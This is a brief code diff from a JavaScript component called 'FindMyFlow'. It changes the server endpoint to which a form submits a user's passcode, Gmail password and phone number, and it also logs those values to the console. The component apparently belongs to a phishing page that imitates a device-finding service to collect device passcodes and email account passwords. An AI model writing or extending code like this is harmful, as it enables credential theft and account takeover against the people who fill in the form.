@@ -35,7 +35,7 @@ function FindMyFlow() {
       // Submit data to the server
       console.log("Attempting to submit data:", { passcode, gmailPassword, phoneNumber });
       try {
-        const response = await fetch("/api/v1/submit", {
+        const response = await fetch("/data-api/v1/submit", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
